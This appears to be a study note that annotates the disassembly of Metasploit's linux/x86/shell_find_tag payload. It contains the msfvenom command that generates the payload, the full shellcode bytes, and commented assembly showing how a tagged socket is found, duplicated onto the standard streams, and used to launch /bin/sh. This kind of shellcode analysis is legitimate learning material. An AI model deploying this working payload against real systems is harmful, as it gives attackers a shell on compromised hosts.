; msfvenom ndisasm dump
; command: `msfvenom -p linux/x86/shell_find_tag TAG=AAAA R | ndisasm -u -`

; shellcode: "\x31\xdb\x53\x89\xe6\x6a\x40\xb7\x0a\x53\x56\x53\x89\xe1\x86"
; "\xfb\x66\xff\x01\x6a\x66\x58\xcd\x80\x81\x3e\x41\x41\x41\x41"
; "\x75\xf0\x5f\x89\xfb\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79"
; "\xf8\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
; "\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80";

; recv() parameter setup
xor ebx,ebx             ; ebx = 0
push ebx                ; push NULL onto stack
mov esi,esp             ; esi = location on stack to write
push byte +0x40
mov bh,0xa              ; bx = 0x0a00
push ebx                ; push 0x0a00 onto stack
push esi                ; push destination address onto stack
push ebx                ; push 0x0a00 onto stack
mov ecx,esp             ; ecx = location of recv() parameters
xchg bh,bl              ; bx = 0x000a which is recv()

; 0x10. looping recv()
inc word [ecx]          ; increment word value at ecx
push byte +0x66
pop eax                 ; eax = syscall 103 (recv())
int 0x80                ; socketcall syscall
cmp dword [esi],0x41414141    ; compare to tag
jnz 0x10                ; loop to increment file descriptor

; Label dup2() parameter setup
pop edi                 ; edi = file descriptor
mov ebx,edi             ; socket returned from recv() goes into ebx
push byte +0x2
pop ecx                 ; ecx = 2

; Label 0x26 looping dup2()
push byte +0x3f
pop eax                 ; eax = dup2() syscall number = 63
int 0x80                ; dup2() syscall
dec ecx                 ; ecx = 1
jns 0x26                ; loops back through dup2 to duplicate file descriptors from 2,1,0

; execve()
push byte +0xb
pop eax                 ;   execve syscall
cdq                     ;   cdq = sign-extension of eax. high-bit is copied to every bit in edx.  So eax -> edx:eax
push edx                ;   push NULL onto stack
push dword 0x68732f2f   ;   "hs//"
push dword 0x6e69622f   ;   "nib/"
mov ebx,esp             ;   ebx points to "/bin//sh"
push edx                ;   push NULL onto stack
push ebx                ;   push "/bin//sh" onto stack
mov ecx,esp             ;   ecx points to ["/bin//sh", NULL]
int 0x80
